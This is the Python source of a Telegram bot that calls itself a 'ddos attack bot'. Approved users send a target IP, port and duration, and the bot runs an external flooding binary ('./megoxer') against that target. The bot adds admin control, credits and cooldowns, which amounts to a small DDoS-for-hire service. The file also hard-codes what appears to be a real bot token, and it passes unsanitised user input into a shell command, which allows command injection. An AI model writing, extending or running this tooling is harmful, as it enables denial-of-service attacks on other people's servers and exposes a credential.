import telebot
import subprocess
import datetime
import os
from cryptography.fernet import Fernet

# Replace with your Telegram bot token
bot = telebot.TeleBot('7263687509:AAEJRP4e9sIZCji9mjrfm7C7tB1FCrSj3CM')

# Admin user IDs
admin_id = ["898630244"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# Encrypted log file
LOG_FILE = "log.enc"

# Encryption key (you can save this securely in an environment variable)
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Cooldown and user credit system
bgmi_cooldown = {}
user_credits = {}
DAILY_CREDIT_LIMIT = 10

# Track attack state
bot.attack_in_progress = False
bot.attack_end_time = None

# List to store banned users
banned_users = []

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Encrypt and log commands
def secure_log(log_entry):
    encrypted_entry = cipher.encrypt(log_entry.encode())
    with open(LOG_FILE, "ab") as file:
        file.write(encrypted_entry + b'\n')

# Decrypt and read logs
def decrypt_logs():
    try:
        with open(LOG_FILE, "rb") as file:
            logs = file.readlines()
            return [cipher.decrypt(log.strip()).decode() for log in logs]
    except FileNotFoundError:
        return []

# Check if user is banned
def is_banned(user_id):
    return user_id in banned_users

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.from_user.id) in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                bot.reply_to(message, f"User {user_to_add} has been approved!\nWelcome to our community! Let’s make some magic happen! ✨")
            else:
                bot.reply_to(message, "User already exists.")
        else:
            bot.reply_to(message, "Please specify a user to add.")
    else:
        bot.reply_to(message, "Unauthorized access! Contact @DipXD")
        secure_log(f"Unauthorized attempt to use /add by {message.from_user.id} at {datetime.datetime.now()}.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.from_user.id)  # Use sender's ID in groups or private chats

    if user_id in banned_users:
        bot.reply_to(message, "You are banned from using this bot.")
        return

    if user_id in allowed_user_ids:
        # Check if user is an admin
        is_admin = user_id in admin_id

        # Prevent overlapping attacks
        if bot.attack_in_progress:
            bot.send_message(
                message.chat.id,
                "*⚠️ Please wait!*\n"
                "*The bot is busy with another attack.*\n"
                "*Check remaining time with the /when command.*",
                parse_mode='Markdown'
            )
            return

        # Cooldown check (only for non-admin users)
        if not is_admin and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
            bot.reply_to(message, "Cooldown in effect, please wait 1 minute.")
            return

        # Credit check
        user_credits[user_id] = user_credits.get(user_id, DAILY_CREDIT_LIMIT)
        if user_credits[user_id] <= 0:
            bot.reply_to(message, "You have no remaining credits for today.")
            return

        # Process command
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], int(command[2]), int(command[3])
            if time > 120:  # Restrict attack time to 120 seconds
                bot.reply_to(message, "Error: Use less than 120 seconds.")
            else:
                # Mark attack as in progress
                bot.attack_in_progress = True
                bot.attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time)

                # Get the username or default to the user ID if username is not set
                username = message.from_user.username or f"User {user_id}"

                # Send enhanced attack message
                bot.send_message(
                    message.chat.id,
                    f"*🚀 Attack Initiated! 💥*\n\n"
                    f"👑 **Commander**: `{username}`\n"
                    f"🗺️ Target IP:  `{target}`\n"
                    f"🔌 Target Port: `{port}`\n"
                    f"⏳ Duration: `{time} seconds`\n",
                    parse_mode='Markdown'
                )

                # Update cooldown only for non-admin users
                if not is_admin:
                    bgmi_cooldown[user_id] = datetime.datetime.now()

                user_credits[user_id] -= 1
                full_command = f"./megoxer {target} {port} {time}"
                
                # Execute the command
                subprocess.run(full_command, shell=True)

                # Reset attack state after completion
                bot.attack_in_progress = False
                bot.attack_end_time = None
        else:
            bot.reply_to(message, "Usage: /bgmi <ip> <port> <time_sec>\n\nExample  /bgmi 52.140.12.129 10683 30")
    else:
        bot.reply_to(message, "Unauthorized access! Contact @DipXD")
        secure_log(f"Unauthorized attempt to use /bgmi by {message.from_user.id} at {datetime.datetime.now()}.")

@bot.message_handler(commands=['when'])
def when_command(message):
    if bot.attack_in_progress:
        remaining_time = (bot.attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"The current attack will end in {int(remaining_time)} seconds.")
    else:
        bot.reply_to(message, "No attack is currently in progress.")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    **Available Commands:**
    /start - Welcome message
    /help - Show this help message
    /add <user_id> - Add a new user (Admin only)
    /ban <user_id> - Ban a user (Admin only)
    /unban <user_id> - Unban a user (Admin only)
    /bgmi <target> <port> <duration> - Execute a command with cooldown and credit limits
    /when - Check remaining time for the current attack
    /logs - View encrypted logs (Admin only)
    /broadcast <message> - Broadcast a message to all users (Admin only)
    /status - Show bot uptime and active users (Admin only)
    
    **Usage Notes:**
    - Replace <user_id>, <target>, <port>, and <duration> with appropriate values.
    - Contact an admin for permissions or support.
    """
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(
        message,
        "Welcome to the ddos attack bot!"
    )

# Start the bot
bot.polling()

